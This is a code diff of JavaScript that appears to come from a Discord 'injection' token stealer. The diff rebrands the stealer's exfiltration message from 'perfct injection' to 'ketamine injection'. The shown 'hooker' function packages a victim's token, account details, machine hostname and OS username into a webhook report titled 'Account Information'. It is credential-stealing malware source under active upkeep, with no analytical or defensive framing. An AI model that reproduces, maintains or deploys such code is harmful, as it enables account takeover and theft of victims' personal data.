@@ -147,8 +147,8 @@ const request = async (method, url, headers, data) => {
 
 const hooker = async (content, token, account) => {
     content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
-    content["username"] = "Perfct";
-    content["avatar_url"] = "https://i.ibb.co/0Y3C9pT/fbfb40d3634a7c74ec4016f7bc9c09c7.jpg";
+    content["username"] = "ketamine";
+    content["avatar_url"] = "https://media.discordapp.net/attachments/1335939210259202109/1336612884544749579/3a917af6eb75358c8f35b713df662f1a.png?ex=67a47140&is=67a31fc0&hm=816c38a1d26944bac605fad2df87dd4ac865754b1a9d11bd726539a1e9d05475&=&format=webp&quality=lossless&width=465&height=465";
     content["embeds"][0]["author"] = {
         "name": account.username,
     };
@@ -156,8 +156,8 @@ const hooker = async (content, token, account) => {
         "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
     };
     content["embeds"][0]["footer"] = {
-        "text": "perfct injection",
-        "icon_url": "https://i.ibb.co/0Y3C9pT/fbfb40d3634a7c74ec4016f7bc9c09c7.jpg",
+        "text": "ketamine injection",
+        "icon_url": "https://media.discordapp.net/attachments/1335939210259202109/1336612884544749579/3a917af6eb75358c8f35b713df662f1a.png?ex=67a47140&is=67a31fc0&hm=816c38a1d26944bac605fad2df87dd4ac865754b1a9d11bd726539a1e9d05475&=&format=webp&quality=lossless&width=465&height=465",
     };
     content["embeds"][0]["title"] = "Account Information";
 
